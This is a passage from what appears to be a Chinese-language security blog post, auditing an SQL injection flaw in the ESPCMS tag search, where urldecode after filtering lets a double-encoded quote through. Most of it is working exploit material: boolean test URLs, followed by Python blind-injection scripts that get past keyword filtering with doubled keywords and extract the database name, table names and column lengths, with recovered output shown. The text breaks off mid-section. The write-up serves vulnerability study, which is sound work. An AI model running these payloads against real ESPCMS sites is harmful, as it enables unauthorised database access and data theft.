class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'G'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$page</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$lng</span> <span class="token operator">=</span> <span class="token punctuation">(</span>admin_LNG <span class="token operator">==</span> <span class="token string single-quoted-string">'big5'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_lancode'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> admin_LNG<span class="token punctuation">;</span><span class="token variable">$tagkey</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tagkey'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'R'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tagkey</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">inputcodetrim</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">' WHERE lng=\''</span> <span class="token operator">.</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' AND isclass=1'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$linkURL</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">callmessage</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'search_err'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$linkURL</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gobackbotton'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pagemax</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token variable">$pagesylte</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$templatesDIR</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_templatesdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'article'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$templatefilename</span> <span class="token operator">=</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$templatesDIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/search'</span><span class="token punctuation">;</span><span class="token variable">$db_table</span> <span class="token operator">=</span> db_prefix <span class="token operator">.</span> <span class="token string single-quoted-string">'document'</span><span class="token punctuation">;</span><span class="token variable">$countnum</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">db_numrows</span><span class="token punctuation">(</span><span class="token variable">$db_table</span><span class="token punctuation">,</span> <span class="token variable">$db_where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$countnum</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$numpage</span> <span class="token operator">=</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$countnum</span> <span class="token operator">/</span> <span class="token variable">$pagemax</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$numpage</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class="token interpolation"><span class="token variable">$db_table</span></span> <span class="token interpolation"><span class="token variable">$db_where</span></span> LIMIT 0,<span class="token interpolation"><span class="token variable">$pagemax</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageBotton</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$pagemax</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$countnum</span><span class="token punctuation">,</span> <span class="token variable">$numpage</span><span class="token punctuation">,</span> <span class="token variable">$pagesylte</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file_fileex'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pagebotton'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gopageurl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_rewrite'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageSQL</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pid,did'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$rsList</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$rs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'typename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_type</span><span class="token punctuation">(</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tid'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'typename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'doc'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'buylink'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'buylink'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'enqlink'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'enqlink'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctitle'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"&lt;font color='"</span> <span class="token operator">.</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;"</span> <span class="token operator">.</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/font&gt;"</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token variable">$keyname</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$keyword</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;font color="#F00000"&gt;&lt;u&gt;'</span> <span class="token operator">.</span> <span class="token variable">$keyword</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/u&gt;&lt;/font&gt;'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token variable">$keyname</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$rsList</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagetext'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageStat</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pagetext'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagebotton'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagenu'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">Bottonstyle</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagese'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">pageSelect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagevt'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">Prevbotton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'array'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span> <span class="token variable">$typeread</span><span class="token punctuation">,</span> <span class="token variable">$modelview</span><span class="token punctuation">,</span> <span class="token variable">$LANPACK</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templatefilename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面的几条重要语句</p><p><code>$tagkey = urldecode($this-&gt;fun-&gt;accept('tagkey', 'R'));</code>这句语句就是漏洞的根源，fun先检测，urlencode再转义</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不为空就拼接成where子句</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class="token interpolation"><span class="token variable">$db_table</span></span> <span class="token interpolation"><span class="token variable">$db_where</span></span> LIMIT 0,<span class="token interpolation"><span class="token variable">$pagemax</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建并且执行sql语句，可以看到中间并没有其他的手段</p><p><img src="https://images.dadream.eu.org/images/2024/07/e9cb89dac59d7cb4a2030af0d3f947be.png"></p><p>在如图添加一条回显，方便调试</p><p><img src="https://images.dadream.eu.org/images/2024/07/22db695e34dfe109a22d0f070b6d83a9.png"></p><p>可以看到单引号被转义了，这时利用<code>urldecode()</code>的特性，报错存在注入</p><p><img src="https://images.dadream.eu.org/images/2024/07/dcbb61fbf9e911eed98d38a406c7a466.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$db_where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">' WHERE lng=\''</span> <span class="token operator">.</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' AND isclass=1'</span><span class="token punctuation">;</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有这两条语句得到测试payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=1 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回结果为真</p><p><img src="https://images.dadream.eu.org/images/2024/07/c8bc7735d13bbba8b53d3fdb90b0e277.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=2 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回结果为假<img src="https://z3.ax1x.com/2021/11/25/oArAbt.png" alt="oArAbt.png"></p><p>可以将”暂无内容”设为盲注的标准</p><p>测试注入数据库长度</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or (seleselectct length(database())=9)  %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/31d5b56cb336e7a83ab881317b023504.png"></p><p>相符合，其他的用脚本就能跑出来</p><h2 id="脚本演示"><a href="#脚本演示" class="headerlink" title="脚本演示"></a>脚本演示</h2><h3 id="爆数据库长度"><a href="#爆数据库长度" class="headerlink" title="爆数据库长度"></a>爆数据库长度</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(database()))={} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token comment"># 9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>database_length <span class="token operator">=</span> <span class="token number">9</span>database_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> database_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct database()),{0}, 1))={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            database_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''eesespespcespcmespcmsespcms_espcms_vespcms_v5'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆表的长度（第一个表）"><a href="#爆表的长度（第一个表）" class="headerlink" title="爆表的长度（第一个表）"></a>爆表的长度（第一个表）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(table_name) frfromom information_schema.tables whwhereere table_schema=database() limit 0,1)={} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 19</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要爆其他表可以在<code>limit</code>的第一参数更改，或者再加一个循环</p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>table_length <span class="token operator">=</span> <span class="token number">19</span>table_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> table_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct table_name frfromom information_schema.tables whwhereere table_schema=database() limit 0,1),{0}, 1))={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            table_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment"># xxxxxxxadmin_member</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆列的长度"><a href="#爆列的长度" class="headerlink" title="爆列的长度"></a>爆列的长度</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length(column_name) frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1)={1} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><pre 